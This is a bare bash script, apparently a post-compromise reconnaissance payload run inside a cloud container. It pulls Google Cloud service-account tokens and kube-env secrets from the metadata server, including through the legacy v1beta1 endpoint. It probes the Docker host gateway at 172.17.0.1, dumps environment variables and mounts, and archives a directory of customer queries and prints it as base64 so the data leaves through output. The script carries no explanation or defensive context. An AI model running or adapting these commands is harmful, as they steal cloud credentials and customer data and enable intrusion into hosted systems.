#!/bin/bash
# -*- coding: UTF8 -*-
ps -aux
echo "new token :"
echo "token :"
curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'
curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token'
curl 'http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json'


curl -H "Metadata-Flavor: Google" -H "X-Google-Metadata-Request: True" 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json'
curl -H "Metadata-Flavor: Google" -H "X-Google-Metadata-Request: True" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json'
mount

curl -vv 'http://172.17.0.1/'
curl -vv 'http://172.17.0.1:8443/'


env
echo "/opt search :"
cat /opt/dist/autocomplete.sh
tar cvfz /tmp/temp.tgz /opt/dist/queries/customer
cat /tmp/temp.tgz | base64
